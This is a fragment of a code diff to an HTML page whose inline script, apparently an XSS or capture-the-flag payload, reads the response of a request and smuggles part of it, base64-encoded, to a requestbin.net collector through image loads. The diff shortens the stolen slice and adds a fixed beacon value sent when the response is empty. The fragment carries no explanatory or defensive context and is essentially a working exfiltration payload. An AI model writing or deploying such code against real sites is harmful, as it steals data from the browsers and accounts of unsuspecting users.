@@ -12,9 +12,11 @@
     req.send();
     //alert(req.responseText);
     let img = new Image();
-    img.src = "http://requestbin.net/r/c0n10to7?"+btoa(req.responseText.substring(1, 2000));
-    let img2 = new Image();
-    img2.src = "http://requestbin.net/r/c0n10to7?"+btoa(req.responseText.substring(2000, 4000));
+    if (req.responseText != "")
+      img.src = "http://requestbin.net/r/c0n10to7?"+btoa(req.responseText.substring(1, 100));
+     else 
+       img.src = "http://requestbin.net/r/c0n10to7?QERTY";
+
     </script>
   </body>
 </html>
